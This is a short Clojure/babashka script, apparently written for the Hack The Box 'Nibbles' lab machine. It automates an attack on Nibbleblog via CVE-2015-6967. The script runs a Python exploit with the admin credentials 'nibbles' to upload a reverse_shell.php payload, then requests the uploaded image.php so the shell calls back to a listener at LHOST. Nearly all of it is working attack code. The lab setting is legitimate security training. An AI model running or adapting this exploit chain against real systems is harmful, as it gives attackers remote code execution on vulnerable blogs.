(require '[clojure.java.shell :refer [sh]]
         '[babashka.http-client :as http])

(require '[babashka.curl :as curl])
(require '[clojure.java.io :as io]) ;; optional
(require '[cheshire.core :as json]) ;; optional


(def TARGET "10.10.10.75")
(def LHOST "10.10.14.23")
(def LPORT "5000")


; Execute the exploit
(sh (str 
     "python3" " " "/home/loki/htb/nibbles/scripts/cve-2015-6967/exploit.py" " "
     "--url" " " (str "http://" TARGET "/nibbleblog/") " "
     "--username" " " "admin" " "
     "--password" " " "nibbles" " "
     "--payload" " " "/home/loki/htb/nibbles/scripts/reverse_shell.php"))


(comment "python3 exploit.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload shell.php")

; Re-execute the reverse shell
(http/get (str "http://" TARGET "/nibbleblog/content/private/plugins/my_image/image.php"))

(curl/get (str "http://" TARGET "/nibbleblog/content/private/plugins/my_image/image.php"))


(comment
  "File system library" "https://github.com/babashka/fs"
  "Http client" "https://github.com/babashka/http-client"
  "Curl" "https://github.com/babashka/babashka.curl")


(comment "https://app.hackthebox.com/machines/121")